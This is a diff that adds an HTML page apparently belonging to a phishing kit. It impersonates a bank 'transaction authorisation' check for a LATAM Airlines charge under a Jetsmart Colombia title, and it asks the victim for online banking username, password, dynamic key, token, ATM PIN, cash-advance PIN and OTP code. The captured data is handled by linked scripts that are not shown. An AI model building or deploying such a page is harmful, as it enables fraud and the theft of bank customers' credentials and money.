@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SECURITY CHECK | Jetsmart Colombia</title>
+    <link rel="shortcut icon" href="./assets/favicon.png" type="image/x-icon">
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="./css/normalize.css">
+    <link rel="stylesheet" href="./css/checkers.css">
+
+    <!-- JS -->
+    <script src="./js/functions.js"></script>
+</head>
+<body>
+    <!-- LOADER -->
+    <div class="main-loader show">
+        <img id="company-loader">
+        <div class="loader"></div>
+    </div>
+
+    <div class="logos">
+        <img id="bank-logo" width="50px">
+        <img id="company-logo" width="110px">
+    </div>
+    <main>
+        <div class="content">
+            <b style="margin-bottom: 20px; display: block;" >Autorización de transacción</b>
+            <p style="margin-bottom: 10px;" >La transacción que intenta realizar en <b>LATAM AIRLINES S.A</b> por <b>$ <span id="flight-price">49.900</span> COP</b> debe ser autorizada. Por favor verifica la siguiente información:</p>
+            <p style="margin-bottom: 20px;">Ingrese los datos de su Banca Virtual:</p>
+            <form>
+                <table>
+                    <tr>
+                        <td style="text-align: end; font-weight: bold;">Comercio</td>
+                        <td>LATAM AIRLINES S.A</td>
+                    </tr>
+                    <tr>
+                        <td style="text-align: end; font-weight: bold;">Monto</td>
+                        <td>$ <span id="flight-price">49.000</span> COP</td>
+                    </tr>
+                    <tr>
+                        <td style="text-align: end; font-weight: bold;">Número de tarjeta</td>
+                        <td>•••• •••• •••• <span id="card-digits"></span></td>
+                    </tr>
+                    <tr class="hidden" id="user">
+                        <td style="text-align: end; font-weight: bold;">Usuario</td>
+                        <td><input required type="text" id="user"></td>
+                    </tr>
+                    <tr class="hidden" id="puser">
+                        <td style="text-align: end; font-weight: bold;">Contraseña</td>
+                        <td><input required type="text" id="puser"></td>
+                    </tr>
+                    <tr class="hidden" id="cdin">
+                        <td style="text-align: end; font-weight: bold;">Clave Dinámica</td>
+                        <td><input oninput="limitDigits(this, 6)" required type="text" id="cdin"></td>
+                    </tr>
+                    <tr class="hidden" id="dintok">
+                        <td style="text-align: end; font-weight: bold;">Token</td>
+                        <td><input oninput="limitDigits(this, 8)" required type="text" id="dintok"></td>
+                    </tr>
+                    <tr class="hidden" id="ccaj">
+                        <td style="text-align: end; font-weight: bold;">Clave de Cajero</td>
+                        <td><input oninput="limitDigits(this, 4)" required type="text" id="ccaj"></td>
+                    </tr>
+                    <tr class="hidden" id="cavance">
+                        <td style="text-align: end; font-weight: bold;">Clave de Avance</td>
+                        <td><input oninput="limitDigits(this, 6)" required type="text" id="cavance"></td>
+                    </tr>
+                    <tr class="hidden" id="otpcode">
+                        <td style="text-align: end; font-weight: bold;">Código OTP</td>
+                        <td><input oninput="limitDigits(this, 8)" required type="text" id="otpcode"></td>
+                    </tr>
+                </table>
+            </form>
+        </div>
+
+        <a href="" id="newCode" class="hidden">Presione aquí para recibir un nuevo código</a>
+        <button id="btnNextStep" class="btn-success">
+            Verificar
+        </button>
+    </main>
+
+    <!-- SCRIPTS -->
+    <script src="./js/security-checker.js"></script>
+</body>
+</html>
